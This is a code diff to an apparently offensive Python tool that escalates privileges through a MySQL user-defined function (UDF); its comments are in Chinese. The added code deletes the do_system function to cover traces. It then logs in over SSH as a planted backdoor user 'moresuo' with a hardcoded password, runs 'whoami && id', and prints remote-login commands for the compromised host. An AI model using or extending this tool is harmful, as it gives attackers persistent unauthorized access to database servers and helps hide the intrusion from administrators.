@@ -68,6 +68,56 @@ def _sql_ok(cursor, sql, label=""):
 
 
 # ════════════════════════════════════════════════════════════════
+# SSH 验证
+# ════════════════════════════════════════════════════════════════
+
+# UDF 创建的后门用户密码（passwd 中的加密密码即 password@123）
+_SSH_PASSWORD = "password@123"
+
+
+def _verify_ssh(host, port=22):
+    """SSH 验证 moresuo 用户登录，返回 (ok, output)。"""
+    import logging
+    import warnings
+
+    try:
+        import paramiko
+    except ImportError:
+        return False, "paramiko 未安装"
+
+    with warnings.catch_warnings():
+        warnings.simplefilter("ignore")
+        for name in ("paramiko", "paramiko.transport"):
+            logger = logging.getLogger(name)
+            logger.handlers.clear()
+            logger.addHandler(logging.NullHandler())
+            logger.propagate = False
+            logger.setLevel(logging.CRITICAL)
+
+    ssh = None
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+        ssh.connect(
+            hostname=host, port=port, username="moresuo",
+            password=_SSH_PASSWORD, timeout=10,
+            look_for_keys=False, allow_agent=False,
+            banner_timeout=5, auth_timeout=10, compress=False,
+        )
+        _, stdout, _ = ssh.exec_command("whoami && id", timeout=10)
+        output = stdout.read().decode("utf-8").strip()
+        return True, output
+    except Exception as e:
+        return False, str(e)
+    finally:
+        if ssh:
+            try:
+                ssh.close()
+            except Exception:
+                pass
+
+
+# ════════════════════════════════════════════════════════════════
 # 信息收集
 # ════════════════════════════════════════════════════════════════
 
@@ -289,6 +339,21 @@ def udf_escalate(host, port, password, commands=None):
             except Exception as e:
                 console.print(f"  [fail]✗ {cmd[:80]}... → {e}[/fail]")
 
+        # ── 第 10 步：删除函数（清理痕迹）─────────────────────
+        console.print("[info]→ 第 10 步：删除 do_system 函数[/info]")
+        _sql_ok(cursor, "DROP FUNCTION IF EXISTS do_system")
+        console.print("  [success]✔ do_system 已删除[/success]")
+
+        # ── 第 11 步：SSH 验证 moresuo 登录 ────────────────────
+        console.print("[info]→ 第 11 步：SSH 验证 moresuo 登录[/info]")
+        ssh_ok, ssh_output = _verify_ssh(host)
+        if ssh_ok:
+            console.print(f"  [success]✔ SSH 验证成功[/success]")
+            for line in ssh_output.strip().split("\n"):
+                console.print(f"    [success]{line}[/success]")
+        else:
+            console.print(f"  [fail]✗ SSH 验证失败: {ssh_output}[/fail]")
+
         # ── 汇总 ──────────────────────────────────────────────
         console.print()
         summary = Table(box=None, show_header=False, padding=(0, 2))
@@ -298,11 +363,12 @@ def udf_escalate(host, port, password, commands=None):
         summary.add_row("MySQL 版本", info.get("version", "?"))
         summary.add_row("plugin_dir", plugin_dir)
         summary.add_row("UDF 路径", dump_path)
+        summary.add_row("SSH 验证", f"[success]通过[/success]" if ssh_ok else f"[fail]失败[/fail]")
         summary.add_row("远程登录", f"ssh moresuo@{host}")
         summary.add_row("提权验证", f"ssh moresuo@{host} 'whoami'")
         console.print(Panel(summary, title="[header]UDF 提权完成[/header]", border_style="success"))
 
-        return True
+        return ssh_ok
 
     finally:
         try:
